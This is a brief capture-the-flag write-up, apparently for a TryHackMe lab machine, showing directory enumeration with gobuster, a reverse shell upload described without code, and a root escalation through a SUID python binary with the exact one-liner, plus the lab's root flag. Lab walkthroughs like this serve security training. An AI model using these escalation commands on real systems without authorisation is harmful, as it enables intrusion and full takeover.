First, let's gather information about the target.

Reconnaissance:

    Two ports are open.
    Apache version 2.4.29 is running.
    SSH service is running on port 22.

Using Gobuster, I found some hidden directories:

Starting gobuster in directory enumeration mode:
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.49.101/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.49.101/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.49.101/js/]

Discovered some files:

    http://10.10.49.101/css/home.css
    http://10.10.49.101/css/panel.css

I uploaded a reverse shell and got a shell.
Using the command:

find / -type f -name user.txt 2>/dev/null

I found a flag.
Privilege Escalation:

Now that we have a shell, let's escalate our privileges to root.

    I searched for files with SUID permission (Set User ID) by running the following command:

find / -user root -perm /4000

This command searches for files owned by the root user with the SUID permission, which allows a program to run with the privileges of the file's owner (in this case, root).

    I identified the suspicious file:
    /usr/bin/python.

I then ran this Python command to spawn a root shell:

python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

Finally, I typed whoami to confirm that I now had root access, and I retrieved the root flag:
THM{pr1v1l3g3_3sc4l4t10n}.
